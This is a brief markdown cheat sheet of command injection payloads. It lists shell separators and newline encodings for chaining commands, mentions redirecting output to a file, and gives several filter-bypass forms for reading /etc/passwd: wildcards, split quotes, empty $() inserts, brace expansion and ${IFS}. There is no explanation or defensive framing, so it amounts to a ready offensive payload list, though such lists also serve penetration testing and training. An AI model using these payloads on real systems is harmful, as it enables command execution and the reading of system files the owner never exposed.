# Command Injection

- concat commands
  ```
  ;
  &
  &&
  |
  ||
  newline (0x0a, \n, %0a)
  ```
- write to file with ``>``
- filter bypass
  ```
  cat /etc/passwd
  cat /etc/pa??wd
  cat /etc/pa*wd
  cat /et’ ‘c/passw’ ‘d
  cat /et$()c/pa$()$swd
  {cat,/etc/passwd}
  cat${IFS}/etc/passwd
  ```
